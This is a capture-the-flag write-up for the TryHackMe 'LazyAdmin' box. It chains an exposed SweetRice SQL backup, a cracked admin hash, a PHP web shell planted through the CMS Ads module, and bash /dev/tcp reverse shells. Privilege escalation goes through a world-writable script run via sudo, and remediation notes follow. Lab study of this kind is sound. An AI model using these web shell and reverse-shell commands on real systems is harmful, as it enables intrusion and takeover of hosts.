# TryHackMe - LazyAdmin

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Author:** jakespillers

---
## Attack Chain

```
nmap
  -> feroxbuster -> /content/ (SweetRice 1.5.1)
    -> exposed SQL backup -> credentials (manager:Password123)
      -> admin login -> Ads module PHP injection -> RCE (www-data)
        -> sudo -l -> NOPASSWD perl backup.pl
          -> backup.pl calls world-writable /etc/copy.sh
            -> overwrite copy.sh -> root shell
```

---

## 1. Enumeration

### Nmap

```bash
sudo nmap -sC -sV -T4 --min-rate=1000 <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

Apache is serving the default Ubuntu page on port 80 -- the real application is mounted under a subdirectory.

---

### Directory Brute Force

```bash
feroxbuster -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

**Key findings:**

|Path|Notes|
|---|---|
|`/content/`|SweetRice CMS root|
|`/content/as/index.php`|Admin login panel|
|`/content/changelog.txt`|Version disclosure (1.5.1)|
|`/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`|SQL backup with credentials|

---

## 2. Credential Extraction

Pull the SQL backup:

```bash
curl http://<TARGET_IP>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

Inside the `INSERT INTO` options data, extract:

```
admin:   manager
passwd:  42f749ade7f9e195bf475f37a44cafcb  (MD5)
```

### Crack the Hash

```bash
hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
```

Or use crackstation.net.

**Result:** `Password123`

---

## 3. Admin Access

Navigate to:

```
http://<TARGET_IP>/content/as/index.php
```

Login with:

- Account: `manager`
- Password: `Password123`

---

## 4. RCE via Ads Module (EDB-ID: 40700)

SweetRice 1.5.1 allows admins to insert raw PHP into the Ads section. The saved ad is written as an executable PHP file.

1. In the dashboard, go to **Ads** in the left sidebar
2. Click to create a new ad
3. Set a name (e.g. `pentest`)
4. In the code field, insert:

```php
<?php system($_GET['cmd']); ?>
```

5. Save the ad
    
6. Verify RCE:
    

```bash
curl "http://<TARGET_IP>/content/inc/ads/pentest.php?cmd=id"
```

Expected output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell:

```bash
curl "http://<TARGET_IP>/content/inc/ads/pentest.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'"
```

### Stabilize the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. Local Enumeration

```bash
ls /home/
# itguy

cat /home/itguy/user.txt
# THM{63e5bce9271952aad1113b6f1ac28a07}

cat /home/itguy/mysql_login.txt
# rice:randompass  (not needed for privesc)

cat /home/itguy/backup.pl
# #!/usr/bin/perl
# system("sh", "/etc/copy.sh");

sudo -l
# (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

ls -la /etc/copy.sh
# -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

---

## 7. Privilege Escalation

The privesc chain:

1. `www-data` can run `backup.pl` as root with no password via sudo
2. `backup.pl` calls `/etc/copy.sh` via `sh`
3. `/etc/copy.sh` has world-write permissions (`rwx` for others)

Overwrite `/etc/copy.sh` with a reverse shell payload (must use `bash -c` wrapper because `sh` does not support `>&` redirection natively):

```bash
echo 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1"' > /etc/copy.sh
```

Start a second listener:

```bash
nc -lvnp 5555
```

Trigger the privesc:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

---

## 8. Root Flag

```bash
cat /root/root.txt
# THM{6637f41d0177b6f37cb20d775124699f}
```

---

## Vulnerability Summary

|Vulnerability|Location|Impact|
|---|---|---|
|Sensitive file exposure|`/content/inc/mysql_backup/`|Credential disclosure|
|Weak password|SweetRice admin account|Authentication bypass|
|PHP code injection|SweetRice Ads module|Remote code execution|
|Sudo misconfiguration|www-data sudo rule|Privilege escalation|
|World-writable script|`/etc/copy.sh`|Root code execution|

---

## Remediation

|Finding|Fix|
|---|---|
|Exposed backup directory|Restrict web access to `/inc/` with .htaccess or move backups outside web root|
|Weak admin password|Enforce strong password policy|
|PHP injection in Ads|Sanitize and restrict code input fields in CMS|
|NOPASSWD sudo entry|Remove or scope sudo rules; require password|
|World-writable system script|`chmod 750 /etc/copy.sh`; audit all scripts called by privileged processes|

---

## Tools Used

- nmap
- feroxbuster
- curl
- hashcat / crackstation
- netcat
- python3 (shell stabilization)